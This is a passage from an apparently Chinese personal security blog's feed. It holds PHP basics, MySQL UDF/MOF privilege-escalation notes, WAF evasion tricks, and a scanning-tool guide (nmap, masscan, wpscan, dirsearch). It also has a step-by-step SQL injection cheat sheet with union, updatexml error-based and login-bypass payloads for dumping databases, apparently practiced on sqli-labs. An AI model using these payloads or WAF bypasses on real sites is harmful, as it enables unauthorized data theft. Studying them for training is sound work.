class="string">&quot;.&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;My sister&#x27;s name is &quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">writeName</span>(<span class="string">&quot;Hege&quot;</span>,<span class="string">&quot;!&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;My brother&#x27;s name is &quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">writeName</span>(<span class="string">&quot;Ståle&quot;</span>,<span class="string">&quot;?&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="函数-返回值"><a href="#函数-返回值" class="headerlink" title="函数 - 返回值"></a>函数 - 返回值</h2><p>如需让函数返回一个值，请使用 return 语句</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$x</span>,<span class="variable">$y</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$total</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$total</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1 + 16 = &quot;</span> . <span class="title function_ invoke__">add</span>(<span class="number">1</span>,<span class="number">16</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

]]></content>
  </entry>
  <entry>
    <title>MySQL提权</title>
    <url>/2023/04/19/mysql%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>udf函数按照其运行模式可以分为单次调用型和聚集函数型两类，单词调用型能够针对数据库查询的每一行记录进行处理，聚集函数型用于处理 group by等聚集函数。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>攻击者通过编写调用cmd或者shell的udf.dll文件，并且导入到一个指定的文件夹目录下，然后创建一个指向udf.dll的自定义函数，从而在数据库进行查询，而查询的结果则等价于在cmd或shell中执行命令。</p>
<h3 id="存放位置"><a href="#存放位置" class="headerlink" title="存放位置"></a>存放位置</h3><p>Windows 2000操作系统需要导出udf.dll到c:\winnt\udf.dll；Windows 2003操作系统导出udf.dll到c:\Windows\udf.dll；</p>
<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>mof是windows系统的一个文件（在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。</p>
<p>当mysql账户权限是root，然后使用root权限去执行我们上传的mof，隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
<h3 id="浏览器解码"><a href="#浏览器解码" class="headerlink" title="浏览器解码"></a>浏览器解码</h3><p>atob()</p>
<p>​						</p>
]]></content>
  </entry>
  <entry>
    <title>关于我</title>
    <url>/2023/04/17/hello-world/</url>
    <content><![CDATA[<h1 id="Hi-Boys-and-Girls"><a href="#Hi-Boys-and-Girls" class="headerlink" title="Hi Boys and Girls!"></a>Hi Boys and Girls!</h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Screenshot_20230419_094457.jpg"
                     
                ></p>
<p>​		你们好，我是Cream（笔名：顾彬彬），00后，就读于某某学院（hint：“老徐你要老婆不要?”），软件工程专业， 写Blog(博客)为了记录自己的学习历程，监督自己学习，督促自己成长，个人觉得只有自己写出来的知识才是学到手的东西，那才是自己的东西，现在已经入行网络信息安全行业了，现在还在沉淀阶段，以后也会深耕这个行业，并为之奉献，为中国的信息安全行业贡献自己的一份力量，抵制国外黑客入侵，保卫中国信息安全，从你我做起，从现在做起，识别钓鱼链接，不点击钓鱼链接，不给敌人可乘之机。</p>
<h2 id="我的技能"><a href="#我的技能" class="headerlink" title="我的技能"></a>我的技能</h2><ul>
<li>目前主攻的还是web安全方向，也会一些网络华为数通、安全设备的知识</li>
<li>会渗透测试的基本流程，有实战漏扫经验、目前任职于一家国内等保测评公司</li>
</ul>
<h2 id="我的兴趣爱好"><a href="#我的兴趣爱好" class="headerlink" title="我的兴趣爱好"></a>我的兴趣爱好</h2><p>以下是一些少有的坚持下来的爱好：</p>
<p>旅行：去过杭州西湖、成都春熙路、成都武侯祠、乐山大佛、湖南岳阳楼、上海东方明珠等等，但是还是想去西藏拉萨、故宫博物馆、北京八达岭长城，计划利用放假时间出去好好玩玩，记录美好时光<br>唱歌：有事没有机会唱一下，唱歌能够使人发泄不快乐的情绪，有利于保持好心情，哈哈哈<br>游戏：以前玩儿，现在很少玩了，以前主玩英雄联盟，但是操作跟不上了就放下了，现在也只玩玩手游联盟，陶冶情操罢了</p>
<h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/2029766.jpg"
                     
                ></p>
<p>​		很高兴你能够访问我的Blog（博客），希望可以帮助到你，同时也非常高兴认识你！😊</p>
]]></content>
  </entry>
  <entry>
    <title>WAF&quot;web应用程序防火墙&quot;</title>
    <url>/2023/04/19/waf/</url>
    <content><![CDATA[<h1 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h1><p>是一种用于保护Web应用程序的安全设备，Web应用程序是指通过Web浏览器访问的应用程序。WAF的目的是保护Web应用程序免受黑客、网络上的攻击。</p>
<h1 id="和防火墙的区别"><a href="#和防火墙的区别" class="headerlink" title="和防火墙的区别"></a>和防火墙的区别</h1><p>和传统防火墙的区别是，它是工作在应用层的防火墙，主要对web请求&#x2F;响应进行防护。</p>
<h1 id="waf原理"><a href="#waf原理" class="headerlink" title="waf原理"></a>waf原理</h1><p>WAF可以通过对Web应用程序的流量进行过滤和监控，识别并阻止潜在的安全威胁。WAF可以检测Web应用程序中的各种攻击，例如SQL注入、跨站点脚本攻击（XSS）、跨站请求伪造（CSRF）等，并采取相应的措施，例如拦截请求、阻止访问、记录事件等<br>WAF的工作原理通常包括以下几个步骤：</p>
<p>流量识别：WAF识别来自客户端的请求，并对请求进行分析。WAF可以检查请求头、请求体、Cookie、URL参数等信息，并识别其中的攻击。</p>
<p>攻击检测：WAF对识别的请求进行攻击检测。WAF可以使用多种技术来检测攻击，例如正则表达式、特征匹配、行为分析等。WAF可以检测多种攻击，包括SQL注入、XSS、CSRF、命令注入等。</p>
<p>攻击响应：WAF根据检测结果采取相应的措施，例如拦截请求、阻止访问、记录事件等。WAF可以使用多种技术来响应攻击，例如重定向、报错、拦截等。</p>
<p>日志记录：WAF记录所有请求和响应的详细信息，包括请求头、请求体、响应头、响应体等。WAF可以将日志发送给中央日志管理系统，以便进行分析和审计。</p>
<h1 id="waf分类"><a href="#waf分类" class="headerlink" title="waf分类"></a>waf分类</h1><p>WAF可以在多个层次对Web应用程序进行保护。常见的WAF包括：</p>
<p>硬件WAF：硬件WAF通常是一种独立设备，它可以与网络交换机、路由器等设备集成，拦截来自外部网络的流量，并对Web应用程序进行保护。硬件WAF通常具有高性能和低延迟，适用于高流量的Web应用程序。</p>
<p>软件WAF：软件WAF通常是一种安装在服务器上的应用程序，可以通过修改Web服务器或代理服务器的配置文件实现。软件WAF可以与多种Web服务器和应用程序框架集成，包括Apache、Nginx、IIS等。软件WAF通常具有灵活性和易于配置的优点，适用于多种Web应用程序。</p>
<p>云WAF：云WAF通常是一种基于云的服务，可以将Web应用程序的流量转发到云端进行处理。云WAF可以提供全球分布的节点，从而提高Web应用程序的可用性和性能。云WAF通常具有弹性扩展、自动升级等优点，适用于高可用性和高性能的Web应用程序。</p>
<h1 id="WAF的特点"><a href="#WAF的特点" class="headerlink" title="WAF的特点"></a>WAF的特点</h1><p>监测和拦截恶意流量：WAF可以监测流经其设备的所有流量，对恶意流量进行拦截，保护Web应用程序免受各种攻击。</p>
<p>基于规则的检测：WAF通常采用基于规则的检测技术，通过预定义规则或自定义规则来检测并拦截恶意流量。</p>
<p>防止漏洞利用：WAF可以检测和拦截各种漏洞利用攻击，如SQL注入、XSS、CSRF、命令注入等。</p>
<p>安全策略：WAF可以通过安全策略来限制流量的来源、目标和类型，从而实现更精细的流量控制和访问控制。</p>
<p>高可用性：WAF通常具有高可用性，可以通过多节点部署和负载均衡来实现高可靠性和可扩展性。</p>
<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>1、脏数据绕过<br>即传入一段长数据使waf失效，从而实现绕过waf。某些waf处理POST的数据时，只会检测开头的8K，后面选择全部放过。<br>2、高并发绕过<br>对请求进行并发，攻击请求会被负载均衡调度到不同节点，导致某些请求绕过了waf的拦截<br>3、编码绕过<br>对请求数据进行编码，例如url编码，Unicode编码等，如果waf对数据不能有效的解码，而应用后端能够正常解码，就可以绕过waf。<br>例如最常见的url编码，对数据进行二次url编码，waf进行一次解码并不能解析到有效的数据，而后端在进行解码时传入的为有效的恶意数据。<br>4、请求方式转换<br>waf 在对危险字符进行检测的时候，分别为 post 请求和 get 或者其它的请求方式设定了不同的匹配规则，请求被拦截，变 换请求方式有几率能绕过检测</p>
]]></content>
  </entry>
  <entry>
    <title>sql注入的注入攻略</title>
    <url>/2023/04/19/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E6%94%BB%E7%95%A5/</url>
    <content><![CDATA[<h1 id="联合注入攻略"><a href="#联合注入攻略" class="headerlink" title="联合注入攻略"></a>联合注入攻略</h1><h2 id="1、判断注入点（同时构造闭合符号）"><a href="#1、判断注入点（同时构造闭合符号）" class="headerlink" title="1、判断注入点（同时构造闭合符号）"></a>1、判断注入点（同时构造闭合符号）</h2><p>当输入?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) and 1&#x3D;1 – q   &#x2F;&#x2F; 正常</p>
<p>而输入?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) and 1&#x3D;2 – q   &#x2F;&#x2F;报错</p>
<p>则可证明是存在sql注入的。</p>
<h2 id="2、判断字段数"><a href="#2、判断字段数" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) order by 3 -- q   //若报错则字段数不为3，没报错则字段数就是3</span><br></pre></td></tr></table></figure></div>

<h2 id="3、判断输出点"><a href="#3、判断输出点" class="headerlink" title="3、判断输出点"></a>3、判断输出点</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,3 -- q   //这里注意前面的传参id要是不存在的，这样后面的select查询才能显现出来</span><br></pre></td></tr></table></figure></div>

<h2 id="4、爆出数据库名"><a href="#4、爆出数据库名" class="headerlink" title="4、爆出数据库名"></a>4、爆出数据库名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,database() -- q</span><br></pre></td></tr></table></figure></div>

<h2 id="5、爆出表名"><a href="#5、爆出表名" class="headerlink" title="5、爆出表名"></a>5、爆出表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- q</span><br></pre></td></tr></table></figure></div>

<h2 id="6、爆字段名"><a href="#6、爆字段名" class="headerlink" title="6、爆字段名"></a>6、爆字段名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;要查的表名&#x27; -- q		//查询表下的字段名</span><br></pre></td></tr></table></figure></div>

<h2 id="7、爆字段内的数据"><a href="#7、爆字段内的数据" class="headerlink" title="7、爆字段内的数据"></a>7、爆字段内的数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1(  &#x27;,&quot;,&#x27;),&quot;),&#x27;]  ) union select 1,group_concat(字段名),group_concat(字段名) from 要查的表名 -- q</span><br></pre></td></tr></table></figure></div>

<h1 id="布尔报错注入的注入攻略"><a href="#布尔报错注入的注入攻略" class="headerlink" title="布尔报错注入的注入攻略"></a>布尔报错注入的注入攻略</h1><p>报错注入是没有回显点位的，只能运用updatexml()函数来进行让他报错，从报错信息里面的到我们需要的信息。</p>
<h2 id="1、构造闭合符号"><a href="#1、构造闭合符号" class="headerlink" title="1、构造闭合符号"></a>1、构造闭合符号</h2><p><strong>第一种情况</strong>：<strong>不是</strong>该闭合符</p>
<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  )   &#x2F;&#x2F;正常</p>
<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) –+   &#x2F;&#x2F;正常</p>
<p><strong>第二种情况</strong>：<strong>是</strong>该闭合符</p>
<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  )   &#x2F;&#x2F;报错</p>
<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) –+   &#x2F;&#x2F;正常</p>
<p>或者</p>
<p>?id&#x3D;1(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) and 1&#x3D;1(2) –+      &#x2F;&#x2F;变幻1&#x3D;1,1&#x3D;2来进行判断，如果是当前的构造符号，1&#x3D;2时应该报错，如果是正常则可以不是正确的构造符，通过变幻构造符好来判断出正常的构造符号</p>
<h2 id="2、发现是报错注入，采用updataxml函数进行爆数据库名"><a href="#2、发现是报错注入，采用updataxml函数进行爆数据库名" class="headerlink" title="2、发现是报错注入，采用updataxml函数进行爆数据库名"></a>2、发现是报错注入，采用updataxml函数进行爆数据库名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,database()),1) -- q    //显示当前数据库的库名。Concat()时进行一个拼接的，把感叹号（！）和逗号后面的数据进行拼接。</span><br></pre></td></tr></table></figure></div>

<h2 id="3、爆数据表名"><a href="#3、爆数据表名" class="headerlink" title="3、爆数据表名"></a>3、爆数据表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1) --+</span><br></pre></td></tr></table></figure></div>

<h2 id="4、爆字段名"><a href="#4、爆字段名" class="headerlink" title="4、爆字段名"></a>4、爆字段名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;),&#x27;!&#x27;),1) --+</span><br></pre></td></tr></table></figure></div>

<h2 id="5、爆字段数据"><a href="#5、爆字段数据" class="headerlink" title="5、爆字段数据"></a>5、爆字段数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(要查的字段名) from 表名),&#x27;!&#x27;),1) --+</span><br></pre></td></tr></table></figure></div>

<h1 id="基于错误的POST型联合注入-11、12关"><a href="#基于错误的POST型联合注入-11、12关" class="headerlink" title="基于错误的POST型联合注入(11、12关)"></a>基于错误的POST型联合注入(11、12关)</h1><h2 id="1、尝试万能密码"><a href="#1、尝试万能密码" class="headerlink" title="1、尝试万能密码"></a><strong>1、尝试万能密码</strong></h2><p>(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  )or 1&#x3D;1 – q</p>
<h2 id="2、判断字段数-1"><a href="#2、判断字段数-1" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or 1=1 order by 3 -- q</span><br></pre></td></tr></table></figure></div>

<h2 id="3、判断显错位"><a href="#3、判断显错位" class="headerlink" title="3、判断显错位"></a>3、判断显错位</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,database() -- q</span><br></pre></td></tr></table></figure></div>

<h2 id="4、判断表名"><a href="#4、判断表名" class="headerlink" title="4、判断表名"></a>4、判断表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -- q</span><br></pre></td></tr></table></figure></div>

<h2 id="5、爆列名"><a href="#5、爆列名" class="headerlink" title="5、爆列名"></a>5、爆列名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;要查的表名&#x27; -- q</span><br></pre></td></tr></table></figure></div>

<h2 id="6、爆数据"><a href="#6、爆数据" class="headerlink" title="6、爆数据"></a>6、爆数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(字段名) from 要查的表名 -- q</span><br></pre></td></tr></table></figure></div>

<h1 id="POST变形双报错注入-13、14，17是密码行未过滤"><a href="#POST变形双报错注入-13、14，17是密码行未过滤" class="headerlink" title="POST变形双报错注入(13、14，17是密码行未过滤)"></a>POST变形双报错注入(13、14，17是密码行未过滤)</h1><h2 id="1、万能密码判断是否存在注入点"><a href="#1、万能密码判断是否存在注入点" class="headerlink" title="1、万能密码判断是否存在注入点"></a>1、万能密码判断是否存在注入点</h2><p>(  <strong>‘</strong>,<strong>“</strong>,<strong>‘)</strong>,<strong>“)</strong>,<strong>‘]</strong>  ) or 1&#x3D;1 – q</p>
<h2 id="2、利用报错信息爆库"><a href="#2、利用报错信息爆库" class="headerlink" title="2、利用报错信息爆库"></a>2、利用报错信息爆库</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,database()),1) -- q</span><br></pre></td></tr></table></figure></div>

<h2 id="3、爆数据表名-1"><a href="#3、爆数据表名-1" class="headerlink" title="3、爆数据表名"></a>3、爆数据表名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1) -- q</span><br></pre></td></tr></table></figure></div>

<h2 id="4、爆字段名-1"><a href="#4、爆字段名-1" class="headerlink" title="4、爆字段名"></a>4、爆字段名</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;),&#x27;!&#x27;),1) -- q</span><br></pre></td></tr></table></figure></div>

<h2 id="5、爆字段数据-1"><a href="#5、爆字段数据-1" class="headerlink" title="5、爆字段数据"></a>5、爆字段数据</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(&#x27;!&#x27;,(select group_concat(要查的字段名) from 表名),&#x27;!&#x27;),1) -- q</span><br></pre></td></tr></table></figure></div>

<h1 id="抓包修改user-agent"><a href="#抓包修改user-agent" class="headerlink" title="抓包修改user-agent"></a>抓包修改user-agent</h1><p>‘ and updatexml(1,concat(0x7e,(select database()),0x7e),1,1) – q</p>
]]></content>
  </entry>
  <entry>
    <title>web渗透涉及到的工具</title>
    <url>/2023/04/20/web%E6%B8%97%E9%80%8F%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%92%8C%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><p>子域名、C段、旁注、目录探测、服务器端口、服务器脚本语言及版本、CMS识别、web中间件、web框架、数据库类型和及版本、操作系统及版本</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/web%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.jpg"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/web%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86_%E8%84%91%E5%9B%BE.png"
                     
                ></p>
<h3 id="1-1、探测存活主机"><a href="#1-1、探测存活主机" class="headerlink" title="1.1、探测存活主机"></a>1.1、探测存活主机</h3><p>arping（跟ping命令一样的）、fping、masscan、genlist</p>
<h2 id="1-1-1、fping（ip网段存活扫描）"><a href="#1-1-1、fping（ip网段存活扫描）" class="headerlink" title="1.1.1、fping（ip网段存活扫描）"></a>1.1.1、fping（ip网段存活扫描）</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fping -asng 172.16.12.0/24      //扫描网段中的使用过的ip并列出来</span><br><span class="line">-ag和-g的区别就在于回显的结果 -ag仅仅回显存活的ip地址 -g的意思是回显整个网段所有IP的存活情况,-s 参数是对最后结果的一个统计 -n 将目标以主机名或域名显示</span><br></pre></td></tr></table></figure></div>

<h4 id="1-1-2、masscan（主机存活扫描、端口扫描）"><a href="#1-1-2、masscan（主机存活扫描、端口扫描）" class="headerlink" title="1.1.2、masscan（主机存活扫描、端口扫描）"></a>1.1.2、masscan（主机存活扫描、端口扫描）</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 172.16.12.130 -p0-65535 --max-rate 100000 -v    //扫描ip地址的全端口，masscan默认速率是100包/s，这里指定10万包/s</span><br><span class="line">msscan -p 1-65535 ip --rate=1000</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/web%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20230324112901692.png"
                      alt="image-20230324112901692"
                ></p>
<h3 id="1-2、路由发现"><a href="#1-2、路由发现" class="headerlink" title="1.2、路由发现"></a>1.2、路由发现</h3><h4 id="netdiscover-二层发现"><a href="#netdiscover-二层发现" class="headerlink" title="netdiscover(二层发现)"></a><strong>netdiscover(二层发现)</strong></h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 172.16.12.0/24    //-r指定网段</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/web%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20230324112253775.png"
                      alt="image-20230324112253775"
                ></p>
<h3 id="1-3、网络扫描"><a href="#1-3、网络扫描" class="headerlink" title="1.3、网络扫描"></a>1.3、网络扫描</h3><h4 id="Nmap、masscan-扫描发包贼快"><a href="#Nmap、masscan-扫描发包贼快" class="headerlink" title="Nmap、masscan(扫描发包贼快)"></a>Nmap、masscan(扫描发包贼快)</h4><h2 id="2、漏洞分析"><a href="#2、漏洞分析" class="headerlink" title="2、漏洞分析"></a>2、漏洞分析</h2><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h4><p>Nmap是一款常用的网络扫描工具</p>
<p><strong>主机发现：nmap -sn&#x2F;-sP 172.16.12.0&#x2F;24</strong></p>
<p><strong>端口扫描：nmap -Pn&#x2F;-sS&#x2F;-sT&#x2F;-sU 172.16.12.136</strong></p>
<ul>
<li><code>-sn</code>：主机发现，只进行主机发现，不进行端口扫描</li>
<li><code>-sP</code>  : 对网段进行ping扫描，然后将对ping扫描做出响应的主机列出来，并不会继续测试（如端口扫描或者操做系统探测），主机禁ping时，使用-Pn 强制默认存活</li>
<li><code>-Pn</code>: 不进行主机存活ping扫描检测，直接对目标主机进行端口扫描</li>
<li><code>-sS</code>: 使用SYN扫描方式探测主机端口是否开放</li>
<li><code>-sT</code>: 使用TCP全连接扫描方式探测主机端口是否开放</li>
<li><code>-sU</code>: 使用UDP扫描方式探测主机是否开放UDP端口</li>
<li><code>-A</code>: 开启操作系统、版本、服务等信息的探测</li>
<li><code>-p</code>: 指定扫描的端口及端口范围，如<code>-p 1-1000</code></li>
<li><code>-sV</code>:检测服务版本，这种扫描方式能够用来扫描目标主机和端口上运行的版本，并将它列出来。</li>
<li><code>-O</code>: 对主机系统版本扫描</li>
<li><code>-v</code>: 显示详细扫描信息</li>
<li><code>-iL</code>: 指定扫描目标列表文件</li>
<li><code>--top-ports</code>: 指定扫描最常用的端口，如<code>--top-ports 10</code>表示扫描前10个常用端口</li>
<li><code>-script </code>: 指定扫描脚本</li>
<li><code>-T4</code>： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4</li>
<li><code>-e eth0</code>：指定使用eth0网卡进行探测</li>
</ul>
<h2 id="3、Web程序"><a href="#3、Web程序" class="headerlink" title="3、Web程序"></a>3、Web程序</h2><h3 id="3-1、CMS识别"><a href="#3-1、CMS识别" class="headerlink" title="3.1、CMS识别"></a>3.1、CMS识别</h3><h4 id="wpsan（WordPress扫描工具）"><a href="#wpsan（WordPress扫描工具）" class="headerlink" title="wpsan（WordPress扫描工具）"></a>wpsan（WordPress扫描工具）</h4><p>wpscan  –url  -P 跟密码本  -U 跟用户名字典</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/web%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20230324150402376.png"
                      alt="image-20230324150402376"
                ></p>
<h3 id="3-2、Web漏洞扫描"><a href="#3-2、Web漏洞扫描" class="headerlink" title="3.2、Web漏洞扫描"></a>3.2、Web漏洞扫描</h3><h4 id="whatweb-web指纹识别扫描工具-、wpscan"><a href="#whatweb-web指纹识别扫描工具-、wpscan" class="headerlink" title="whatweb(web指纹识别扫描工具)、wpscan"></a>whatweb(web指纹识别扫描工具)、wpscan</h4><h4 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h4><p><strong>web指纹</strong>扫描主要用于对应用名称（版本）、服务器软件（版本）、编程语言（版本）、应用框架（版本）四大特征的识别，以实现对目标应用的准确标识。</p>
<p>whatweb能够识别各种关于网站的详细信息包括：CMS类型、博客平台、中间件、web框架模块、网站服务器、脚本类型、JavaScript库、IP、cookie等等。WhatWeb有超过1000个插件，每个插件都能识别不同的东西。WhatWeb还标识版本号，电子邮件地址，账户ID，Web框架模块，SQL错误等<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/web%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20230324151648345.png"
                      alt="image-20230324151648345"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">whatweb www.baidu.com -v //详细列出百度网站的信息</span><br></pre></td></tr></table></figure></div>

<h3 id="3-3、Web爬取"><a href="#3-3、Web爬取" class="headerlink" title="3.3、Web爬取"></a>3.3、Web爬取</h3><p>dirb、dirbuster、御剑、gobuster、dirsearch</p>
<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><p>Dirsearch是一个用Python编写的开源目录扫描器，用于枚举Web服务器上的隐藏文件和目录。其主要功能包括自定义字典、支持多线程、用户代理伪装、扫描结果过滤等。</p>
<p>以下是Dirsearch的一些常用命令：</p>
<ul>
<li><code>-u</code>：指定要扫描的URL或主机名</li>
<li><code>-e</code>：指定要排除的目录或文件扩展名</li>
<li><code>-x</code>：指定要排除的目录或文件名</li>
<li><code>-w</code>：指定自定义字典文件的路径</li>
